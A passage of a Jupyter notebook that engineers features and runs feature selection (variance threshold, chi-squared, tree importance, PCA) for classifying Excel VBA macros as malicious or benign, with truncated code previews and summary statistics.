       "      <td>'Option Explicit\\nPrivate Sub Workbook_BeforeC...</td>\n",
       "      <td>\\nPrivate Sub Workbook_BeforeClose(Cancel As B...</td>\n",
       "      <td>private sub workbook_beforeclosecancel as boo...</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 17 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label                                           vba_code  \\\n",
       "0          1  Private Sub Workbook_BeforeClose(Cancel As Boo...   \n",
       "1          1  Option Explicit\\nOption Explicit\\nOption Expli...   \n",
       "2          0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "3          0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "4          0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "...      ...                                                ...   \n",
       "31883      0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31884      1  Option Explicit\\n\\nPrivate Sub Workbook_Open()...   \n",
       "31885      1  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...   \n",
       "31886      0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "31887      0  'Option Explicit\\nPrivate Sub Workbook_BeforeC...   \n",
       "\n",
       "                               vba_code_without_comments  \\\n",
       "0      Private Sub Workbook_BeforeClose(Cancel As Boo...   \n",
       "1      Option Explicit\\nOption Explicit\\nOption Expli...   \n",
       "2      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "3      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "4      \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "...                                                  ...   \n",
       "31883  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "31884  Option Explicit\\n\\nPrivate Sub Workbook_Open()...   \n",
       "31885  Option Explicit\\n\\nPrivate Sub CFixPicture_Act...   \n",
       "31886  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "31887  \\nPrivate Sub Workbook_BeforeClose(Cancel As B...   \n",
       "\n",
       "                                        cleaned_vba_code  code_length  \\\n",
       "0      private sub workbook_beforeclosecancel as bool...         1070   \n",
       "1      option explicit option explicit option explici...        13092   \n",
       "2       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "3       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "4       private sub workbook_beforeclosecancel as boo...         3428   \n",
       "...                                                  ...          ...   \n",
       "31883   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "31884  option explicit private sub workbook_open appl...        12274   \n",
       "31885  option explicit private sub cfixpicture_activa...         1000   \n",
       "31886   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "31887   private sub workbook_beforeclosecancel as boo...         3428   \n",
       "\n",
       "       num_lines  avg_chars_per_line  num_exclamation_marks  num_loops  \\\n",
       "0             34           31.470588               0.000000          0   \n",
       "1            420           31.171429               0.000229         23   \n",
       "2             86           39.860465               0.002042          1   \n",
       "3             86           39.860465               0.002042          1   \n",
       "4             86           39.860465               0.002042          1   \n",
       "...          ...                 ...                    ...        ...   \n",
       "31883         86           39.860465               0.002042          1   \n",
       "31884        402           30.532338               0.000244         23   \n",
       "31885         42           23.809524               0.000000          0   \n",
       "31886         86           39.860465               0.002042          1   \n",
       "31887         86           39.860465               0.002042          1   \n",
       "\n",
       "       num_loops_length  num_functions  num_numeric_literals  \\\n",
       "0              0.000000       0.003738              0.001869   \n",
       "1              0.000687       0.002215              0.008631   \n",
       "2              0.000292       0.002334              0.019253   \n",
       "3              0.000292       0.002334              0.019253   \n",
       "4              0.000292       0.002334              0.019253   \n",
       "...                 ...            ...                   ...   \n",
       "31883          0.000292       0.002334              0.019253   \n",
       "31884          0.000081       0.003340              0.007414   \n",
       "31885          0.000000       0.006000              0.000000   \n",
       "31886          0.000292       0.002334              0.019253   \n",
       "31887          0.000292       0.002334              0.019253   \n",
       "\n",
       "       num_string_literals  has_error_handling  has_url_or_ip  \\\n",
       "0                 0.005607                   0              0   \n",
       "1                 0.006416                   1              0   \n",
       "2                 0.008460                   0              1   \n",
       "3                 0.008460                   0              1   \n",
       "4                 0.008460                   0              1   \n",
       "...                    ...                 ...            ...   \n",
       "31883             0.008460                   0              1   \n",
       "31884             0.003748                   1              0   \n",
       "31885             0.000000                   1              0   \n",
       "31886             0.008460                   0              1   \n",
       "31887             0.008460                   0              1   \n",
       "\n",
       "       has_information_disclosure  is_obfuscated  \n",
       "0                               1              0  \n",
       "1                               1              0  \n",
       "2                               1              1  \n",
       "3                               1              1  \n",
       "4                               1              1  \n",
       "...                           ...            ...  \n",
       "31883                           1              1  \n",
       "31884                           1              0  \n",
       "31885                           0              0  \n",
       "31886                           1              1  \n",
       "31887                           1              1  \n",
       "\n",
       "[31888 rows x 17 columns]"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df['label'] = train_df['label'].replace('white',1, regex=True) \n",
    "train_df['label'] = train_df['label'].replace('mal',0, regex=True) \n",
    "train_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "6b5a30fd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Index(['label', 'vba_code', 'vba_code_without_comments', 'cleaned_vba_code',\n",
       "       'code_length', 'num_lines', 'avg_chars_per_line',\n",
       "       'num_exclamation_marks', 'num_loops', 'num_loops_length',\n",
       "       'num_functions', 'num_numeric_literals', 'num_string_literals',\n",
       "       'has_error_handling', 'has_url_or_ip', 'has_information_disclosure',\n",
       "       'is_obfuscated'],\n",
       "      dtype='object')"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df.columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "f8490669",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>num_loops_length</th>\n",
       "      <th>num_functions</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>is_obfuscated</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>1070</td>\n",
       "      <td>34</td>\n",
       "      <td>31.470588</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003738</td>\n",
       "      <td>0.001869</td>\n",
       "      <td>0.005607</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>13092</td>\n",
       "      <td>420</td>\n",
       "      <td>31.171429</td>\n",
       "      <td>0.000229</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000687</td>\n",
       "      <td>0.002215</td>\n",
       "      <td>0.008631</td>\n",
       "      <td>0.006416</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>1</td>\n",
       "      <td>12274</td>\n",
       "      <td>402</td>\n",
       "      <td>30.532338</td>\n",
       "      <td>0.000244</td>\n",
       "      <td>23</td>\n",
       "      <td>0.000081</td>\n",
       "      <td>0.003340</td>\n",
       "      <td>0.007414</td>\n",
       "      <td>0.003748</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>1</td>\n",
       "      <td>1000</td>\n",
       "      <td>42</td>\n",
       "      <td>23.809524</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.006000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000292</td>\n",
       "      <td>0.002334</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 14 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label  code_length  num_lines  avg_chars_per_line  \\\n",
       "0          1         1070         34           31.470588   \n",
       "1          1        13092        420           31.171429   \n",
       "2          0         3428         86           39.860465   \n",
       "3          0         3428         86           39.860465   \n",
       "4          0         3428         86           39.860465   \n",
       "...      ...          ...        ...                 ...   \n",
       "31883      0         3428         86           39.860465   \n",
       "31884      1        12274        402           30.532338   \n",
       "31885      1         1000         42           23.809524   \n",
       "31886      0         3428         86           39.860465   \n",
       "31887      0         3428         86           39.860465   \n",
       "\n",
       "       num_exclamation_marks  num_loops  num_loops_length  num_functions  \\\n",
       "0                   0.000000          0          0.000000       0.003738   \n",
       "1                   0.000229         23          0.000687       0.002215   \n",
       "2                   0.002042          1          0.000292       0.002334   \n",
       "3                   0.002042          1          0.000292       0.002334   \n",
       "4                   0.002042          1          0.000292       0.002334   \n",
       "...                      ...        ...               ...            ...   \n",
       "31883               0.002042          1          0.000292       0.002334   \n",
       "31884               0.000244         23          0.000081       0.003340   \n",
       "31885               0.000000          0          0.000000       0.006000   \n",
       "31886               0.002042          1          0.000292       0.002334   \n",
       "31887               0.002042          1          0.000292       0.002334   \n",
       "\n",
       "       num_numeric_literals  num_string_literals  has_error_handling  \\\n",
       "0                  0.001869             0.005607                   0   \n",
       "1                  0.008631             0.006416                   1   \n",
       "2                  0.019253             0.008460                   0   \n",
       "3                  0.019253             0.008460                   0   \n",
       "4                  0.019253             0.008460                   0   \n",
       "...                     ...                  ...                 ...   \n",
       "31883              0.019253             0.008460                   0   \n",
       "31884              0.007414             0.003748                   1   \n",
       "31885              0.000000             0.000000                   1   \n",
       "31886              0.019253             0.008460                   0   \n",
       "31887              0.019253             0.008460                   0   \n",
       "\n",
       "       has_url_or_ip  has_information_disclosure  is_obfuscated  \n",
       "0                  0                           1              0  \n",
       "1                  0                           1              0  \n",
       "2                  1                           1              1  \n",
       "3                  1                           1              1  \n",
       "4                  1                           1              1  \n",
       "...              ...                         ...            ...  \n",
       "31883              1                           1              1  \n",
       "31884              0                           1              0  \n",
       "31885              0                           0              0  \n",
       "31886              1                           1              1  \n",
       "31887              1                           1              1  \n",
       "\n",
       "[31888 rows x 14 columns]"
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "col = ['label', 'code_length', 'num_lines', 'avg_chars_per_line',\n",
    "       'num_exclamation_marks', 'num_loops', 'num_loops_length',\n",
    "       'num_functions', 'num_numeric_literals', 'num_string_literals',\n",
    "       'has_error_handling', 'has_url_or_ip', 'has_information_disclosure',\n",
    "       'is_obfuscated']\n",
    "corr_df = train_df[col]\n",
    "corr_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "01ac2a97",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: >"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1000x500 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "#correlation\n",
    "plt.figure(figsize=(10,5))\n",
    "sns.heatmap(corr_df.corr(),annot=True,cmap=\"YlGnBu\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "f69cbff6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "has_url_or_ip\n",
       "0    19072\n",
       "1    12816\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df['has_url_or_ip'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "d5a84524",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "is_obfuscated\n",
       "0    17390\n",
       "1    14498\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df['is_obfuscated'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "94c92bb8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "has_error_handling\n",
       "0    25244\n",
       "1     6644\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df['has_error_handling'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "037fe6a1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "has_information_disclosure\n",
       "1    20046\n",
       "0    11842\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "train_df['has_information_disclosure'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "78d5e7eb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0.5, 1.0, 'Distributional of length')"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1600x500 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "f, axes = plt.subplots(1,1, figsize = (16, 5))\n",
    "g1 = sns.histplot(train_df['code_length'], color=\"black\",ax = axes)\n",
    "plt.title(\"Distributional of length\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "0dc9378e",
   "metadata": {},
   "outputs": [],
   "source": [
    "mal = train_df[train_df['label'] == 0]\n",
    "white = train_df[train_df['label'] == 1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "dd583f95",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: xlabel='code_length', ylabel='num_loops'>"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1600x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize = (16,8))\n",
    "sns.scatterplot(x = mal['code_length'], y = mal['num_loops'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "dc26850b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: xlabel='code_length', ylabel='num_loops'>"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1600x800 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize = (16,8))\n",
    "sns.scatterplot(x = white['code_length'], y = white['num_loops'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "b6616749",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: xlabel='is_obfuscated', ylabel='count'>"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1600x600 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(16, 6))\n",
    "sns.countplot(x='is_obfuscated', hue='has_url_or_ip', data=train_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0b9ad87a",
   "metadata": {},
   "source": [
    "# Features selection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "8ad32a2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "# PCA, VarianceThreshold, SelectKBest, Tree-based feature selection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c7ef6a31",
   "metadata": {},
   "source": [
    "### VarianceThreshold"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "2e531eaa",
   "metadata": {},
   "outputs": [],
   "source": [
    "X = corr_df.drop('label', axis=1) \n",
    "\n",
    "threshold_value = .8 * (1 - .8)\n",
    "vt = VarianceThreshold(threshold=threshold_value)\n",
    "\n",
    "X_filtered = vt.fit_transform(X)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "1fd11ac2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Index(['code_length', 'num_lines', 'avg_chars_per_line', 'num_loops',\n",
       "       'has_error_handling', 'has_url_or_ip', 'has_information_disclosure',\n",
       "       'is_obfuscated'],\n",
       "      dtype='object')"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "selected_features = X.columns[vt.get_support()]\n",
    "selected_features"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac90d735",
   "metadata": {},
   "source": [
    "### SelectKBest"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "fbe0d826",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Current shape: (31888, 13)\n",
      "New shape: (31888, 10)\n"
     ]
    }
   ],
   "source": [
    "y = corr_df['label']\n",
    "X = corr_df.drop('label', axis=1) \n",
    "print(\"Current shape:\", X.shape)\n",
    "skb = SelectKBest(chi2, k=10)\n",
    "X_new = skb.fit_transform(X, y)\n",
    "\n",
    "print(\"New shape:\", X_new.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "5ff3d5b8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(array([0.00000000e+00, 0.00000000e+00, 0.00000000e+00, 4.25152714e-04,\n",
       "        0.00000000e+00, 2.25490448e-01, 5.31485123e-03, 7.32312911e-08,\n",
       "        4.80530217e-01, 9.55356340e-61, 0.00000000e+00, 0.00000000e+00,\n",
       "        0.00000000e+00]),\n",
       " array(['code_length', 'num_lines', 'avg_chars_per_line',\n",
       "        'num_exclamation_marks', 'num_loops', 'num_numeric_literals',\n",
       "        'has_error_handling', 'has_url_or_ip',\n",
       "        'has_information_disclosure', 'is_obfuscated'], dtype=object),\n",
       " array([ True,  True,  True,  True,  True, False, False,  True, False,\n",
       "         True,  True,  True,  True]))"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "skb.pvalues_,skb.get_feature_names_out(),skb.get_support()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b10d88ff",
   "metadata": {},
   "source": [
    "### Tree-based feature selection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "7233dad2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "X shape: (31888, 13)\n",
      "Feature importance: [0.05636808 0.09154755 0.05669516 0.02281032 0.03134456 0.01858957\n",
      " 0.0452317  0.03398942 0.04146655 0.03881554 0.17148394 0.18646875\n",
      " 0.20518886]\n",
      "X_new shape: (31888, 4)\n"
     ]
    }
   ],
   "source": [
    "y = corr_df['label']\n",
    "X = corr_df.drop('label', axis=1)\n",
    "print(\"X shape:\", X.shape)\n",
    "\n",
    "clf = ExtraTreesClassifier(n_estimators=30)\n",
    "clf = clf.fit(X.values, y)\n",
    "\n",
    "print(\"Feature importance:\", clf.feature_importances_)\n",
    "\n",
    "model = SelectFromModel(clf, prefit=True)\n",
    "X_new = model.transform(X.values)\n",
    "\n",
    "selected_feature_names = X.columns[model.get_support()]\n",
    "\n",
    "X_new_df = pd.DataFrame(X_new, columns=selected_feature_names)\n",
    "\n",
    "print(\"X_new shape:\", X_new_df.shape)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "dd71bb52",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Index(['code_length', 'num_lines', 'avg_chars_per_line',\n",
       "       'num_exclamation_marks', 'num_loops', 'num_loops_length',\n",
       "       'num_functions', 'num_numeric_literals', 'num_string_literals',\n",
       "       'has_error_handling', 'has_url_or_ip', 'has_information_disclosure',\n",
       "       'is_obfuscated'],\n",
       "      dtype='object')"
      ]
     },
     "execution_count": 75,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "X.columns"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69cb155a",
   "metadata": {},
   "source": [
    "### Principal component analysis (PCA)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "9d875427",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[9.99906635e-01 7.37105673e-05 1.66746168e-05 2.92524496e-06\n",
      " 2.88962510e-08 1.43490079e-08 6.54965587e-09]\n",
      "[6.32605115e+05 5.43147583e+03 2.58333606e+03 1.08201702e+03\n",
      " 1.07540914e+02 7.57816246e+01 5.11990869e+01]\n"
     ]
    }
   ],
   "source": [
    "X = corr_df.drop('label', axis=1)\n",
    "pca = PCA(n_components=7)\n",
    "pca.fit(X)\n",
    "\n",
    "print(pca.explained_variance_ratio_)\n",
    "print(pca.singular_values_)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "485ceea7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>is_obfuscated</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_functions</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>1070</td>\n",
       "      <td>34</td>\n",
       "      <td>31.470588</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.005607</td>\n",
       "      <td>1</td>\n",
       "      <td>0.001869</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003738</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>13092</td>\n",
       "      <td>420</td>\n",
       "      <td>31.171429</td>\n",
       "      <td>23</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.006416</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008631</td>\n",
       "      <td>0.000229</td>\n",
       "      <td>0.002215</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
